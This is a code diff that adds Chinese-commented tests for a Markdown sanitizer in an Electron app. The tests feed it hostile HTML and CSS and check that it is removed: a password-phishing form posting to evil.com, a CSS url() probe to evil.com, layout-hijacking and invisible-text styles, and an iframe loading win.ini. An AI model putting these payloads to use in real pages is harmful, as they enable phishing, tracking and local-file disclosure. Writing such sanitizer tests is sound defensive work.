@@ -69,6 +69,22 @@ app.whenReady().then(async () => {
     '  const xss4 = renderMarkdown("<iframe src=\\"file:///C:/Windows/win.ini\\"></iframe>");',
     '  assert("XSS: <iframe> 框架被彻底清除", !xss4.includes("<iframe") && !xss4.includes("win.ini"), xss4);',
     '',
+    '  // 1.1 表单钓鱼拦截（建议 3：禁止可提交表单与输入框）',
+    '  const form1 = renderMarkdown("<form action=\\"http://evil.com\\"><input type=\\"password\\"><button>登录</button><textarea></textarea></form>");',
+    '  assert("Form: <form>/<input>/<button>/<textarea> 表单元素彻底剥离", !form1.includes("<form") && !form1.includes("<input") && !form1.includes("<button") && !form1.includes("<textarea"), form1);',
+    '',
+    '  // 1.2 CSS 属性白名单与布局劫持拦截（建议 2：仅放行排版类）',
+    '  const css1 = renderMarkdown("<span style=\\"position: fixed; top: 0; z-index: 9999; color: red; font-weight: bold;\\">排版文字</span>");',
+    '  assert("CSS: 拦截 position/top/z-index 布局劫持，仅保留 color/font-* 排版属性", !css1.includes("position") && !css1.includes("top") && !css1.includes("z-index") && css1.includes("color") && css1.includes("font-weight"), css1);',
+    '',
+    '  // 1.3 CSS 外部探针与危险模式拦截（建议 2：拦截 url/import/var）',
+    '  const css2 = renderMarkdown("<span style=\\"background: url(http://evil.com/probe.png); color: blue;\\">外部探针</span>");',
+    '  assert("CSS: 拦截 url(...) 外部数据探针，仅保留安全样式", !css2.includes("url") && !css2.includes("evil.com") && css2.includes("color"), css2);',
+    '',
+    '  // 1.4 CSS 伪元素文案与透明欺骗拦截（建议 4：拦截 content/opacity）',
+    '  const css3 = renderMarkdown("<span style=\\"content: fake; opacity: 0;\\">文字</span><style>::before { content: fake }</style>");',
+    '  assert("CSS: 拦截 content 伪造文字与 <style> 标签注入", !css3.includes("content") && !css3.includes("opacity") && !css3.includes("<style"), css3);',
+    '',
     '  // 2. 原生 HTML 保留能力（用户正向用例）',
     '  const html1 = renderMarkdown("<font color=\\"red\\">重要警示</font>");',
     '  assert("HTML: <font color=\\"red\\"> 原生渲染保留", html1.includes("<font") && html1.includes("color=\\"red\\"") && html1.includes("重要警示"), html1);',
@@ -125,7 +141,7 @@ app.whenReady().then(async () => {
     console.error(`\n❌ 测试未通过：共 ${failed} 个断言失败`);
     process.exit(1);
   } else {
-    console.log(`\n🎉 全部 ${results.length} 项测试通过（含 4 项 XSS 拦截、3 项原生 HTML 保留、5 项富文本语法）！`);
+    console.log(`\n🎉 全部 ${results.length} 项测试通过（含 4 项脚本 XSS 拦截、4 项表单/CSS 注入拦截、3 项原生 HTML 保留、5 项富文本语法）！`);
     process.exit(0);
   }
 });
